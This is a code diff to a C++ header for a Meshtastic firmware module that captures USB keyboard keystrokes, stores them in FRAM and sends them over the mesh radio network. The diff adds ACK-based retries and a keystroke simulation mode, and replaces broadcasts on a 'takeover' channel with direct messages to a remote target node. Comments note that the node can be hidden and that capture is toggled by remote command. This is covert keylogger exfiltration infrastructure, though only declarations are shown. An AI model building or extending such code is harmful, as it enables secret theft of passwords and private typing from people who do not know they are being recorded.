@@ -50,6 +50,30 @@ extern FRAMBatchStorage *framStorage;
 #define RUNONCE_INTERVAL_MS       20000     /**< Module runOnce() polling interval (20 seconds) */
 
 /**
+ * @brief ACK-Based Reliable Transmission (v6.0)
+ *
+ * Batches are only deleted from FRAM after receiving explicit ACK from receiver.
+ * Uses exponential backoff for retries: 30s -> 60s -> 120s (capped at 2 min).
+ */
+#define ACK_TIMEOUT_INITIAL_MS    30000     /**< Initial ACK timeout (30 seconds) */
+#define ACK_MAX_RETRIES           3         /**< Maximum retry attempts before giving up */
+#define ACK_BACKOFF_MULTIPLIER    2         /**< Timeout doubles on each retry */
+#define ACK_MAX_TIMEOUT_MS        120000    /**< Maximum timeout cap (2 minutes) */
+
+/**
+ * @brief Keystroke Simulation Mode (for testing without USB keyboard)
+ *
+ * When USB_CAPTURE_SIMULATE_KEYS is defined, the module generates fake keystroke
+ * batches at regular intervals for testing the transmission pipeline.
+ * This bypasses Core1/PIO entirely and injects directly into FRAM storage.
+ */
+#ifdef USB_CAPTURE_SIMULATE_KEYS
+#define SIM_INTERVAL_MS           15000     /**< Interval between simulated batches (15 seconds) */
+#define SIM_MAX_MESSAGE_LEN       100       /**< Maximum simulated message length */
+#define SIM_BATCH_COUNT           5         /**< Number of simulated batches before stopping (0 = infinite) */
+#endif
+
+/**
  * @brief Buffer size configuration constants
  */
 #define MAX_DECODED_TEXT_SIZE     600       /**< Maximum size for decoded text buffer */
@@ -150,8 +174,47 @@ class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
     bool core1_started;
     bool capture_enabled;  // Can be toggled via mesh commands
 
+    // Direct message target (captured from first command sender)
+    // TODO: Add SET_TARGET command to manually configure target node
+    NodeNum targetNode = 0;  // 0 = no target set, non-zero = send DMs to this node
+
     /* Note: Client name and visibility now use Meshtastic's owner.long_name
      * and owner.role (CLIENT_HIDDEN) - no separate storage needed */
+
+    // ==================== ACK-Based Reliable Transmission (v6.0) ====================
+
+    /**
+     * @brief Batch ID counter for ACK correlation
+     * Increments for each batch sent. Persists across power cycles via FRAM header (future).
+     */
+    uint32_t nextBatchId = 1;
+
+    /**
+     * @brief Pending transmission state (single-at-a-time model)
+     *
+     * Only one batch can be in-flight at a time - FRAM holds the rest.
+     * Batch is deleted from FRAM only after ACK received.
+     */
+    struct {
+        uint32_t batch_id;       /**< Batch ID being waited on (0 = no pending) */
+        uint32_t packet_id;      /**< Meshtastic packet ID for this batch */
+        uint32_t send_time;      /**< millis() when sent */
+        uint32_t timeout_ms;     /**< Current timeout value (doubles on retry) */
+        uint8_t retry_count;     /**< Number of retries so far */
+    } pendingTx = {0, 0, 0, ACK_TIMEOUT_INITIAL_MS, 0};
+
+    // ACK statistics
+    uint32_t ack_success_count = 0;   /**< Successful ACKs received */
+    uint32_t ack_timeout_count = 0;   /**< Batches failed after max retries */
+    uint32_t ack_retry_count = 0;     /**< Total retry attempts */
+
+#ifdef USB_CAPTURE_SIMULATE_KEYS
+    // ==================== Simulation Mode State ====================
+
+    uint32_t sim_last_batch_time = 0;  /**< Last simulation batch timestamp */
+    uint32_t sim_batch_count = 0;      /**< Number of batches generated */
+    bool sim_enabled = true;           /**< Simulation active flag */
+#endif
 
     // ==================== Command Processing ====================
 
@@ -214,12 +277,54 @@ class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
                               char *output, size_t max_len);
 
     /**
-     * @brief Broadcast buffer data over the private "takeover" channel
+     * @brief Send buffer data as direct message to target node
+     * Sends to targetNode (captured from first command sender)
+     * If no target set, silently skips transmission
      * @param data Pointer to data buffer
      * @param len Length of data to send
-     * @return true if packet was queued successfully
+     * @param batchId Batch ID to include in header for ACK correlation
+     * @return Packet ID if queued successfully, 0 if failed or no target
      */
-    bool broadcastToPrivateChannel(const uint8_t *data, size_t len);
+    uint32_t sendToTargetNode(const uint8_t *data, size_t len, uint32_t batchId);
+
+    // ==================== ACK Tracking (v6.0) ====================
+
+    /**
+     * @brief Check for ACK timeout and handle retry/failure
+     * Called from runOnce() before processing new batches.
+     * Implements exponential backoff: 30s -> 60s -> 120s (capped).
+     */
+    void checkPendingTimeout();
+
+    /**
+     * @brief Resend the pending batch after timeout
+     * Re-reads batch from FRAM (not deleted until ACK) and retransmits.
+     * @return true if resend successful, false if error
+     */
+    bool resendPendingBatch();
+
+    /**
+     * @brief Handle incoming ACK response for pending transmission
+     * Parses "ACK:0x<batch_id>" format and deletes FRAM batch on match.
+     * @param mp The received mesh packet (PRIVATE_APP port)
+     * @return true if this was an ACK for our pending batch
+     */
+    bool handleAckResponse(const meshtastic_MeshPacket &mp);
+
+#ifdef USB_CAPTURE_SIMULATE_KEYS
+    // ==================== Simulation Mode (v6.1) ====================
+
+    /**
+     * @brief Generate and store a simulated keystroke batch
+     *
+     * Creates a fake batch with test content and writes it directly to FRAM.
+     * Called from runOnce() when simulation mode is enabled.
+     * Bypasses Core1/PIO entirely for testing the transmission pipeline.
+     *
+     * @return true if batch was generated and stored successfully
+     */
+    bool simulateKeystrokes();
+#endif
 };
 
 extern USBCaptureModule *usbCaptureModule;
